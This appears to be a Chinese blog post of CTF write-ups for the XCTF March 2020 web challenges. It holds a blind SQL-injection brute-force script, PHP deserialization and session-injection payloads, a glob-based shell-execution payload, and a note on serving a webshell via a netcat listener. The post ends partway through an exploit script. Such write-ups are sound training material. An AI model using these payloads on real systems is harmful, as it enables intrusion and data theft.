<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="cop's blog"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.5"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.5"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><title>xctf3月赛 | cop's blog</title></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">xctf3月赛</h1><a id="logo" href="/.">cop's blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="Suche"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">xctf3月赛</h1><div class="post-meta"><a href="/2020/03/09/xctf3月赛/#comments" class="comment-count"></a><p><span class="date">Mar 09, 2020</span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>Schlägt</i></i></span></p></div><div class="post-content"><p>队里师傅都太强了，我只配端茶倒水，基本看着师傅们写的文档复现</p>
<h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pdo</span> = new PDO(<span class="string">'mysql:host=localhost;dbname=sqlsql;charset=utf8;'</span>, <span class="string">'xxx'</span>, <span class="string">'xxx'</span>);</span><br><span class="line">    <span class="variable">$pdo</span>-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">"SELECT username from users where username='<span class="variable">$&#123;_POST['username']&#125;</span>' and password='<span class="variable">$&#123;_POST['password']&#125;</span>'"</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;fetchAll();</span><br><span class="line">    <span class="keyword">if</span> (count(<span class="variable">$result</span>) &gt; 0) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>[0][<span class="string">'username'</span>] == <span class="string">'admin'</span>) &#123;</span><br><span class="line">            include(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="built_in">exit</span>();</span><br></pre></td></tr></table></figure>
<p>过滤太多东西了，# - / ;都过滤了注释不了，这道题考得是mysql的弱类型<br>password=0 会匹配出 password是字母或0开头后面存在字母的字段<br><img src="https://uploader.shimo.im/f/IgVYHtjNK74H3eLp.png!thumbnail" alt></p>
<h2 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h2><p>这道题刚开始测试发现过滤了字母，就懵逼了，最后测出来几个可以用的字母，用二进制跑出来的新的字母表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s=<span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    flag1=<span class="string">""</span></span><br><span class="line">    flag=<span class="string">""</span></span><br><span class="line">    i=1</span><br><span class="line">    n=2</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1,20):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        m=64</span><br><span class="line">        j=64</span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> range(1,8):</span><br><span class="line">            <span class="keyword">if</span> q!=1:</span><br><span class="line">                j=j/2</span><br><span class="line">                <span class="keyword">if</span> n==1:</span><br><span class="line">                    m=m+j</span><br><span class="line">                <span class="keyword">elif</span> n==0:</span><br><span class="line">                    m=m-j</span><br><span class="line">            m=int(m)</span><br><span class="line">            w = <span class="string">'&#123;:08b&#125;'</span>.format(m)</span><br><span class="line">            w=flag1+w</span><br><span class="line">            url=<span class="string">"http://121.37.181.246:6333/?time='||('&#123;&#125;'&lt;0b&#123;&#125;)%23"</span>.format(k,w)</span><br><span class="line">            p=requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Hello World --Brian Kernighan"</span> <span class="keyword">in</span> p.text :</span><br><span class="line">                n=0</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                n=1</span><br><span class="line">            <span class="keyword">if</span> q==7:</span><br><span class="line">                <span class="comment">#print(p.text)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"Hello World --Brian Kernighan"</span> <span class="keyword">in</span> p.text :</span><br><span class="line">                    flag=flag+chr(m-1)</span><br><span class="line">                    b = <span class="string">'&#123;:08b&#125;'</span>.format(m-1)</span><br><span class="line">                    flag1=flag1+b</span><br><span class="line">                    <span class="built_in">print</span>(flag1)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flag=flag+chr(m)</span><br><span class="line">                    flag1=w</span><br><span class="line">                    <span class="built_in">print</span>(flag1)</span><br><span class="line">                <span class="built_in">print</span>(k+<span class="string">"="</span>+flag)</span><br></pre></td></tr></table></figure></p>
<p>跑出来的字母表是这样的<br><img src="https://uploader.shimo.im/f/9Ido8J3tujEnDck1.png!thumbnail" alt><br>然后114师傅一看猜到了后台是用，date函数格式化处理的，所以字母前加反斜杠转义就可以了,<a href="https://www.w3school.com.cn/php/func_date_date.asp" target="_blank" rel="noopener">date函数</a><br>这个是有回显的，直接联合查询，查到admin表，admin 20200202goodluck ，还有个url /eGlhb2xldW5n<br>直接访问是个登陆框，登陆之后f12发现 /eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php 直接访问是存在的，base64解码没得到啥有用的信息<br>有个读文件的功能，随便输入个东西提示从本地访问，http头都试了不行，旺哥发现url处存在ssrf<br>用file://localhost/../../../etc/passwd 直接强行穿目录，好强<br><img src="https://uploader.shimo.im/f/Lztq7huCjm4wYwDm.png!thumbnail" alt><br>读了下文件，找到了万恶的index.php，刚开始的注入卡了好久<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);//设置时区调用时间函数防止报错</span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">global <span class="variable">$conn</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$servername</span>=<span class="string">"127.0.0.1"</span>;//数据地址</span><br><span class="line"><span class="variable">$username</span>=<span class="string">"gzmtu"</span>;//数据库用户名</span><br><span class="line"><span class="variable">$parssword</span>=<span class="string">"gzmtu@xiaoleung"</span>;//数据库密码</span><br><span class="line"><span class="variable">$dbname</span>=<span class="string">"trick"</span>;//数据库名字</span><br><span class="line"><span class="variable">$conn</span>=new mysqli(<span class="variable">$servername</span>,<span class="variable">$username</span>,<span class="variable">$parssword</span>,<span class="variable">$dbname</span>);//面向对象写法--连接数据库</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error&lt;&gt;0)//如果连接失败</span><br><span class="line">&#123;</span><br><span class="line">die(<span class="string">"数据库连接失败"</span>.<span class="variable">$conn</span>-&gt;connect_error);//报错</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;set_charset(<span class="string">"utf8"</span>)or die(<span class="string">"设置字符失败"</span>.<span class="variable">$conn</span>-&gt;error);//设置数据库字符编码如果失败则报错</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>有waf不能读flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|fl|la|ag|fla|lag|log/is"</span>, <span class="variable">$parts</span>[<span class="string">'path'</span>]))</span><br></pre></td></tr></table></figure></p>
<p>然后就读了之前f12看到的hint文件,看到了是一个反序列化calc()对content赋值，aiisc_to_chr把content转为字符 content_to_file读文件<br>str_split对字符进行分组，两个数字一组，转为一个字符，要用十进制，但是flag中存在字符十进制是3位数，所以此处要用大写 FLAG<br>这也对应了下面的return strtolower($str) 还有一点是要url编码，payload中有特殊字符<br>passwd就是一个比较常见的小trcik，%0a绕过正则的^$ passwd=a.passwd%0A20200202<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">class trick&#123;</span><br><span class="line">	public <span class="variable">$gf</span>;</span><br><span class="line">	public <span class="keyword">function</span> content_to_file(<span class="variable">$content</span>)&#123;	</span><br><span class="line">		<span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">'pass'</span>];</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,<span class="variable">$passwd</span>)) </span><br><span class="line">	&#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strpos(<span class="variable">$passwd</span>,<span class="string">"20200202"</span>))&#123;</span><br><span class="line">			<span class="built_in">echo</span> file_get_contents(<span class="string">"/"</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 &#125; </span><br><span class="line">		&#125;</span><br><span class="line">	public <span class="keyword">function</span> aiisc_to_chr(<span class="variable">$number</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$number</span>)&gt;2)&#123;</span><br><span class="line">		<span class="variable">$str</span> = <span class="string">""</span>;</span><br><span class="line">		 <span class="variable">$number</span> = str_split(<span class="variable">$number</span>,2);</span><br><span class="line">		 foreach (<span class="variable">$number</span> as <span class="variable">$num</span> ) &#123;</span><br><span class="line">		 	<span class="variable">$str</span> = <span class="variable">$str</span> .chr(<span class="variable">$num</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="built_in">return</span> strtolower(<span class="variable">$str</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">return</span> chr(<span class="variable">$number</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	public <span class="keyword">function</span> <span class="function"><span class="title">calc</span></span>()&#123;</span><br><span class="line">		<span class="variable">$gf</span>=<span class="variable">$this</span>-&gt;gf;</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, <span class="variable">$gf</span>))&#123;</span><br><span class="line">		  	<span class="built_in">eval</span>(<span class="string">'$content='</span>.<span class="variable">$gf</span>.<span class="string">';'</span>);</span><br><span class="line">		  	<span class="variable">$content</span> =  <span class="variable">$this</span>-&gt;aiisc_to_chr(<span class="variable">$content</span>); </span><br><span class="line">		  	<span class="built_in">return</span> <span class="variable">$content</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;content_to_file(<span class="variable">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode(<span class="variable">$_GET</span>[<span class="string">'code'</span>])));</span><br><span class="line"><span class="variable">$a</span>=new trick();</span><br><span class="line"><span class="variable">$s</span>=(~<span class="string">'70766571'</span>);</span><br><span class="line"><span class="variable">$s</span>=<span class="string">"~"</span>.<span class="variable">$s</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;gf=<span class="variable">$s</span>;</span><br><span class="line">print_r(urlencode(base64_encode(serialize(<span class="variable">$a</span>))));</span><br></pre></td></tr></table></figure></p>
<p>还有一种做法是p神的payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;</span><br></pre></td></tr></table></figure></p>
<p>不知道哪错了就是不成，但是有师傅这样做出来了，后续看看别的师傅的wp吧</p>
<h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>先扒个源码 python的题虽然做出来的队很多，但我还是不会<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">from flask import Flask, Response, render_template, request</span><br><span class="line">import secret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Animal:</span><br><span class="line">    def __init__(self, name, category):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        <span class="built_in">return</span> f<span class="string">'Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)'</span></span><br><span class="line"></span><br><span class="line">    def __eq__(self, other):</span><br><span class="line">        <span class="built_in">return</span> <span class="built_in">type</span>(other) is Animal and self.name == other.name and self.category == other.category</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">'__main__'</span>:</span><br><span class="line">            <span class="built_in">return</span> getattr(sys.modules[<span class="string">'__main__'</span>], name)</span><br><span class="line">        raise pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def restricted_loads(s):</span><br><span class="line">    <span class="built_in">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="built_in">read</span>(filename, encoding=<span class="string">'utf-8'</span>):</span><br><span class="line">    with open(filename, <span class="string">'r'</span>, encoding=encoding) as fin:</span><br><span class="line">        <span class="built_in">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def index():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'source'</span>):</span><br><span class="line">        <span class="built_in">return</span> Response(<span class="built_in">read</span>(__file__), mimetype=<span class="string">'text/plain'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        try:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">'data'</span>)</span><br><span class="line">            <span class="keyword">if</span> b<span class="string">'R'</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'No... I don\'</span>t like R-things. No Rabits, Rats, Roosters or RCEs.<span class="string">'</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">                result = restricted_loads(base64.b64decode(pickle_data))</span></span><br><span class="line"><span class="string">                if type(result) is not Animal:</span></span><br><span class="line"><span class="string">                    return '</span>Are you sure that is an animal???<span class="string">'</span></span><br><span class="line"><span class="string">            correct = (result == Animal(secret.name, secret.category))</span></span><br><span class="line"><span class="string">            return render_template('</span>unpickle_result.html<span class="string">', result=result, pickle_data=pickle_data, giveflag=correct)</span></span><br><span class="line"><span class="string">        except Exception as e:</span></span><br><span class="line"><span class="string">            print(repr(e))</span></span><br><span class="line"><span class="string">            return "Something wrong"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    sample_obj = Animal('</span>一给我哩giaogiao<span class="string">', '</span>Giao<span class="string">')</span></span><br><span class="line"><span class="string">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span></span><br><span class="line"><span class="string">    return render_template('</span>unpickle_page.html<span class="string">', sample_obj=sample_obj, pickle_data=pickle_data)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == '</span>__main__<span class="string">':</span></span><br><span class="line"><span class="string">    app.run(host='</span>0.0.0.0<span class="string">', port=5000)</span></span><br></pre></td></tr></table></figure></p>
<h2 id="php-uaf"><a href="#php-uaf" class="headerlink" title="php-uaf"></a>php-uaf</h2><p>这道是直接上<a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">exploit</a><br>但是不晓得为啥一直502，可能是环境被搞坏了</p>
<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p><a href="http://www.zip下载源码，然后开始审计,在login这里是存在seesion直接赋值的，但是有个过滤，没办法插入|字符" target="_blank" rel="noopener">www.zip下载源码，然后开始审计,在login这里是存在seesion直接赋值的，但是有个过滤，没办法插入|字符</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_logged()) &#123;</span><br><span class="line">            redirect(<span class="string">'/?page=upload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_valid_name(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            set_user(<span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">function</span> is_valid_name(<span class="variable">$name</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_string(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> preg_match(<span class="string">'/\A[0-9A-Z]&#123;4,64&#125;\z/i'</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> set_user(<span class="variable">$name</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">'name'</span>] = <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在设置签名的页面也就是upload_sign.php这里，存在sign的seesion赋值操作，而且没有过滤<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:4:<span class="string">"info"</span>:2:&#123;s:5:<span class="string">"admin"</span>;i:1;s:4:<span class="string">"sign"</span>;s:0:<span class="string">""</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后访问profile.php，得到部分源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">require_once(<span class="string">'./init.php'</span>); </span><br><span class="line">error_reporting(0); </span><br><span class="line"><span class="keyword">if</span> (check_session(<span class="variable">$_SESSION</span>)) &#123; </span><br><span class="line">    <span class="comment">#hint : core/clear.php </span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">'./sandbox/'</span> . md5(<span class="string">"Mrk@1xI^"</span> . <span class="variable">$_SERVER</span>[<span class="string">'REMOTE_ADDR'</span>]); </span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$sandbox</span>; </span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>); </span><br><span class="line">    @<span class="built_in">chdir</span>(<span class="variable">$sandbox</span>); </span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'url'</span>])) &#123; </span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">'url'</span>]; </span><br><span class="line">        <span class="keyword">if</span> (filter_var(<span class="variable">$url</span>, FILTER_VALIDATE_URL)) &#123; </span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i'</span>, <span class="variable">$url</span>)) &#123; </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"you are hacker"</span>; </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">                <span class="variable">$res</span> = parse_url(<span class="variable">$url</span>); </span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/127\.0\.0\.1$/'</span>, <span class="variable">$res</span>[<span class="string">'host'</span>])) &#123; </span><br><span class="line">                    <span class="variable">$code</span> = file_get_contents(<span class="variable">$url</span>); </span><br><span class="line">                    <span class="keyword">if</span> (strlen(<span class="variable">$code</span>) &lt;= 4) &#123; </span><br><span class="line">                        @<span class="built_in">exec</span>(<span class="variable">$code</span>); </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">                        <span class="built_in">echo</span> <span class="string">"try again"</span>; </span><br><span class="line">                    &#125; </span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"invalid url"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        highlight_file(__FILE__); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    die(<span class="string">'只有管理员才能看到我哟'</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>附p神文章 <a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a><br>附p3师傅的脚本 单一个.不能生成文件名，这个点我不知道，坑了好久，跑错的话要用clear清除一下 还有 nc -lvp 2333 &lt; 一句话文件<br>filter_var是根据参数检测输入是否合法，compress.zlib://data:@127.0.0.1/plain;base64, 这也的payload也是第一次见 膜<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import base64</span><br><span class="line"><span class="comment">#author:P3rh4ps</span></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://121.36.222.22:88/login.php"</span></span><br><span class="line">s.post(url, data=&#123;<span class="string">'name'</span>:<span class="string">'perhaps'</span>&#125;)</span><br><span class="line">url1 = <span class="string">"http://121.36.222.22:88/?page=upload"</span></span><br><span class="line">s.post(url1, data=&#123;<span class="string">'sign'</span>:<span class="string">'p3rh4ps|O:4:"info":2:&#123;s:5:"admin";i:1;s:4:"sign";s:0:"";&#125;'</span>&#125;)</span><br><span class="line">url3 = <span class="string">"http://121.36.222.22:88/core/index.php"</span></span><br><span class="line">s.get(url3)</span><br><span class="line"></span><br><span 